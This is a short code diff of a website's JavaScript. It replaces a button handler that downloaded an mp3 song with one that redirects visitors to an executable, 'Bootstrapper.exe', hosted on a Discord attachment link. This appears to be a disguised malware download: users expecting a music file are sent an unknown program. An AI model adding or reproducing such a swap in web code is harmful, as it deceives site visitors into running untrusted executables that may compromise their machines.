@@ -1,11 +1,5 @@
-// script.js
-document.getElementById('download-btn').addEventListener('click', function () {
-    // Programmatically create a link and trigger the download
-    const filePath = 'files/snowfall (Slowed  Reverb).mp3'; // File path
-    const link = document.createElement('a'); // Create an <a> element
-    link.href = filePath;
-    link.download = 'snowfall (Slowed  Reverb).mp3'; // Set the file name for download
-    link.click(); // Trigger the click event
+document.getElementById("downloand-btn").addEventListener("click", () => {
+    window.location.href = "https://cdn.discordapp.com/attachments/1316416018066964511/1317127678616141884/Bootstrapper.exe?ex=675d8e3d&is=675c3cbd&hm=deb5564de4acc6e8101e7019d1947cf465256a3850f10880a7d1e7d46d9e9c70&";
 });
 
 document.getElementById("discord-btn").addEventListener("click", () => {
